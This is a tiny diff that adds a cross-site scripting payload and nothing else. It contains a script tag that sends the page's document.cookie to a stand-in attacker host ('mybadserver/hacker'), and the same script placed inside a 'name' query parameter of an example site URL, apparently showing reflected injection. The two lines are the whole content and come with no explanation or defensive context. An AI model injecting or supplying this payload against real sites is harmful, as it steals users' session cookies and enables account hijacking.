@@ -1,0 +1,4 @@
+
+<script>new Image().src="mybadserver/hacker?output="+document.cookie;</script>
+www.yourwebsite.com?name=<script>new Image().src="mybadserver/hacker?output="+document.cookie;</script>
+
